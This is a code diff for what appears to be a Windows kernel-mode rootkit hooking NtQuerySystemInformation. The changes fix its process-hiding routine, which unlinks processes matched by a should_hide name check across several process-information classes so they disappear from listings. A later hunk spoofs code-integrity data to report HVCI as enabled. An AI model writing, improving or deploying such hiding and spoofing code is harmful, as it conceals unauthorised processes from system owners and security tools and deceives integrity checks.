@@ -3,9 +3,6 @@
 #include <var.h>
 #include <wdm.h>
 
-//TODO! 2 BUGS TO FIX!
-//! 1: we should just call ExpQuerySystemInformation with the user's pointer and save the whole kernel-buffer nonsense/extra code.
-//! 2: the last process, and consecutive processes in the linked list aren't hidden currently.
 NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationClass, uint64_t* SystemInformation, uint32_t SystemInformationLength, uint32_t* ReturnLength)
 {
     _SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX* grpBuf = nullptr;
@@ -62,193 +59,139 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
 
         // SystemProcessInformation
         case 0x05: {
-            // busywork
-            uint64_t size = SystemInformationLength;
-            PVOID buf;
-            NTSTATUS s;
-            buf = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
-            if (!buf) return STATUS_INSUFFICIENT_RESOURCES;
+            NTSTATUS s = loc_ExpQuerySystemInformation(0x05, grpBuf, grpBufSize, SystemInformation, SystemInformationLength, ReturnLength);
+            // maybe STATUS_INFO_LENGTH_MISMATCH
+            if (!NT_SUCCESS(s)) return s;
 
-            s = loc_ExpQuerySystemInformation(0x05, grpBuf, grpBufSize, buf, size, &size);
-            if (!NT_SUCCESS(s))
-            {
-                ExFreePoolWithTag(buf, 'NQSI');
-                if (s == STATUS_INFO_LENGTH_MISMATCH) return STATUS_INFO_LENGTH_MISMATCH;
-                else
-                    return s;
-            }
-
-            // the real stuff
-            _SYSTEM_PROCESS_INFORMATION* lastp = NULL;
-            for (_SYSTEM_PROCESS_INFORMATION* p = buf;;) // huh, C allows implicit void* -> Any* casts in declaration, but only for void*. cool
+            _SYSTEM_PROCESS_INFORMATION* last_unhidden_p = NULL;
+            for (_SYSTEM_PROCESS_INFORMATION* p = SystemInformation;;) // huh, C allows implicit void* -> Any* casts in declaration, but only for void*. cool
             {
                 // ImageName: filename of the binary, ex. "python.exe", "python3.exe", "pythonw.exe"
                 // UniqueProcessId: the real PID, ex. 1234
-                if (p->ImageName != NULL && lastp != NULL && should_hide(p->ImageName))
+                if (p->ImageName != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
                 {
-                    lastp->NextEntryOffset += p->NextEntryOffset;
+                    if (p->NextEntryOffset == NULL)
+                    {
+                        last_unhidden_p->NextEntryOffset = NULL;
+                        break;
+                    }
+                    last_unhidden_p->NextEntryOffset += p->NextEntryOffset;
                 }
+                else
+                    last_unhidden_p = p;
 
                 // no more processes; final linked list entry
                 if (!p->NextEntryOffset) break;
 
-                lastp = p;
-                p = (SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
+                p = (_SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
             }
-            memcpy(SystemInformation, buf, size);
-            ExFreePoolWithTag(buf, 'NQSI');
-            *ReturnLength = (uint32_t)size;
             return STATUS_SUCCESS;
         }
         // SystemSessionProcessInformation
         case 0x35: {
-            // busywork
-            SYSTEM_SESSION_PROCESS_INFORMATION q = {0};
-            NTSTATUS s;
+            /////////////////////////////////////////////////
+            NTSTATUS s = loc_ExpQuerySystemInformation(0x35, grpBuf, grpBufSize, SystemInformation, SystemInformationLength, ReturnLength);
+            if (!NT_SUCCESS(s)) return s;
 
-            q.SessionId = session_id;
-            q.SizeOfBuf = SystemInformationLength;
+            SYSTEM_SESSION_PROCESS_INFORMATION* sess = SystemInformation;
 
-            q.Buffer = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
-            if (!q.Buffer) return STATUS_INSUFFICIENT_RESOURCES;
-
-            s = loc_ExpQuerySystemInformation(0x35, grpBuf, grpBufSize, &q, sizeof(q), NULL);
-            if (!NT_SUCCESS(s))
+            _SYSTEM_PROCESS_INFORMATION* last_unhidden_p = NULL;
+            for (_SYSTEM_PROCESS_INFORMATION* p = sess->Buffer;;)
             {
-                ExFreePoolWithTag(buf, 'NQSI');
-                if (s == STATUS_INFO_LENGTH_MISMATCH) return STATUS_INFO_LENGTH_MISMATCH;
-                else
-                    return s;
-            }
-
-            // the real stuff
-            _SYSTEM_PROCESS_INFORMATION* lastp = NULL;
-            for (_SYSTEM_PROCESS_INFORMATION* p = q.Buffer;;)
-            {
-                if (p->ImageName != NULL && lastp != NULL && should_hide(p->ImageName))
+                if (p->ImageName != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
                 {
-                    lastp->NextEntryOffset += p->NextEntryOffset;
+                    if (p->NextEntryOffset == NULL)
+                    {
+                        last_unhidden_p->NextEntryOffset = NULL;
+                        break;
+                    }
+                    last_unhidden_p->NextEntryOffset += p->NextEntryOffset;
                 }
+                else
+                    last_unhidden_p = p;
 
                 if (!p->NextEntryOffset) break;
 
-                lastp = p;
-                p = (SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
+                p = (_SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
             }
-            memcpy(SystemInformation, buf, size);
-            ExFreePoolWithTag(buf, 'NQSI');
-            *ReturnLength = (uint32_t)size;
             return STATUS_SUCCESS;
         }
         // SystemExtendedProcessInformation
         case 0x39: {
-            // busywork
-            uint64_t size = SystemInformationLength;
-            PVOID buf;
-            NTSTATUS s;
-            buf = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
-            if (!buf) return STATUS_INSUFFICIENT_RESOURCES;
+            NTSTATUS s = loc_ExpQuerySystemInformation(0x39, grpBuf, grpBufSize, SystemInformation, SystemInformationLength, ReturnLength);
+            if (!NT_SUCCESS(s)) return s;
 
-            s = loc_ExpQuerySystemInformation(0x39, grpBuf, grpBufSize, buf, size, &size);
-            if (!NT_SUCCESS(s))
+            _SYSTEM_PROCESS_INFORMATION* last_unhidden_p = NULL;
+            for (_SYSTEM_PROCESS_INFORMATION* p = SystemInformation;;)
             {
-                ExFreePoolWithTag(buf, 'NQSI');
-                if (s == STATUS_INFO_LENGTH_MISMATCH) return STATUS_INFO_LENGTH_MISMATCH;
-                else
-                    return s;
-            }
-
-            // the real stuff
-            _SYSTEM_PROCESS_INFORMATION* lastp = NULL;
-            for (_SYSTEM_PROCESS_INFORMATION* p = buf;;)
-            {
-                if (p->ImageName != NULL && lastp != NULL && should_hide(p->ImageName))
+                if (p->ImageName != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
                 {
-                    lastp->NextEntryOffset += p->NextEntryOffset;
+                    if (p->NextEntryOffset == NULL)
+                    {
+                        last_unhidden_p->NextEntryOffset = NULL;
+                        break;
+                    }
+                    last_unhidden_p->NextEntryOffset += p->NextEntryOffset;
                 }
+                else
+                    last_unhidden_p = p;
 
                 if (!p->NextEntryOffset) break;
 
-                lastp = p;
-                p = (SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
+                p = (_SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
             }
-            memcpy(SystemInformation, buf, size);
-            ExFreePoolWithTag(buf, 'NQSI');
-            *ReturnLength = (uint32_t)size;
             return STATUS_SUCCESS;
         }
         // SystemFullProcessInformation
         case 0x94: {
-            // busywork
-            uint64_t size = SystemInformationLength;
-            PVOID buf;
-            NTSTATUS s;
-            buf = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
-            if (!buf) return STATUS_INSUFFICIENT_RESOURCES;
+            NTSTATUS s = loc_ExpQuerySystemInformation(0x94, grpBuf, grpBufSize, SystemInformation, SystemInformationLength, ReturnLength);
+            if (!NT_SUCCESS(s)) return s;
 
-            s = loc_ExpQuerySystemInformation(0x94, grpBuf, grpBufSize, buf, size, &size);
-            if (!NT_SUCCESS(s))
+            _SYSTEM_PROCESS_INFORMATION* last_unhidden_p = NULL;
+            for (_SYSTEM_PROCESS_INFORMATION* p = SystemInformation;;)
             {
-                ExFreePoolWithTag(buf, 'NQSI');
-                if (s == STATUS_INFO_LENGTH_MISMATCH) return STATUS_INFO_LENGTH_MISMATCH;
-                else
-                    return s;
-            }
-
-            // the real stuff
-            _SYSTEM_PROCESS_INFORMATION* lastp = NULL;
-            for (_SYSTEM_PROCESS_INFORMATION* p = buf;;)
-            {
-                if (p->ImageName != NULL && lastp != NULL && should_hide(p->ImageName))
+                if (p->ImageName != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
                 {
-                    lastp->NextEntryOffset += p->NextEntryOffset;
+                    if (p->NextEntryOffset == NULL)
+                    {
+                        last_unhidden_p->NextEntryOffset = NULL;
+                        break;
+                    }
+                    last_unhidden_p->NextEntryOffset += p->NextEntryOffset;
                 }
+                else
+                    last_unhidden_p = p;
 
                 if (!p->NextEntryOffset) break;
 
-                lastp = p;
                 p = (_SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
             }
-            memcpy(SystemInformation, buf, size);
-            ExFreePoolWithTag(buf, 'NQSI');
-            *ReturnLength = (uint32_t)size;
             return STATUS_SUCCESS;
         }
         // SystemBasicProcessInformation
         case 0xFC: {
-            // busywork
-            uint64_t size = SystemInformationLength;
-            PVOID buf;
-            NTSTATUS s;
-            buf = ExAllocatePool2(POOL_FLAG_PAGED, size, 'NQSI');
-            if (!buf) return STATUS_INSUFFICIENT_RESOURCES;
+            NTSTATUS s = loc_ExpQuerySystemInformation(0xFC, grpBuf, grpBufSize, SystemInformation, SystemInformationLength, ReturnLength);
+            if (!NT_SUCCESS(s)) return s;
 
-            s = loc_ExpQuerySystemInformation(0xFC, grpBuf, grpBufSize, buf, size, &size);
-            if (!NT_SUCCESS(s))
+            _SYSTEM_BASICPROCESS_INFORMATION* last_unhidden_p = NULL;
+            for (_SYSTEM_BASICPROCESS_INFORMATION* p = SystemInformation;;)
             {
-                ExFreePoolWithTag(buf, 'NQSI');
-                if (s == STATUS_INFO_LENGTH_MISMATCH) return STATUS_INFO_LENGTH_MISMATCH;
-                else
-                    return s;
-            }
-
-            // the real stuff
-            _SYSTEM_BASICPROCESS_INFORMATION* lastp = NULL;
-            for (_SYSTEM_BASICPROCESS_INFORMATION* p = buf;;)
-            {
-                if (p->ImageName != NULL && lastp != NULL && should_hide(p->ImageName))
+                if (p->ImageName != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
                 {
-                    lastp->NextEntryOffset += p->NextEntryOffset;
+                    if (p->NextEntryOffset == NULL)
+                    {
+                        last_unhidden_p->NextEntryOffset = NULL;
+                        break;
+                    }
+                    last_unhidden_p->NextEntryOffset += p->NextEntryOffset;
                 }
+                else
+                    last_unhidden_p = p;
 
                 if (!p->NextEntryOffset) break;
 
-                lastp = p;
                 p = (_SYSTEM_BASICPROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
             }
-            memcpy(SystemInformation, buf, size);
-            ExFreePoolWithTag(buf, 'NQSI');
-            *ReturnLength = (uint32_t)size;
             return STATUS_SUCCESS;
         }
 
@@ -275,7 +218,7 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
             _SYSTEM_CODEINTEGRITY_INFORMATION ci = {0};
             ci.Length = sizeof(ci);
             // basic spoof HVCI on; if this matters to you, also hook SystemIsolatedUserModeInformation etc
-            // the important part is that the ENABLED bit is faked
+            // the important part is that the ENABLED bit is spoofed
             ci.CodeIntegrityOptions = 0x2000 + 0x0400 + 0x1000 + 0x0001;
             memcpy(SystemInformation, &ci, sizeof(ci));
 
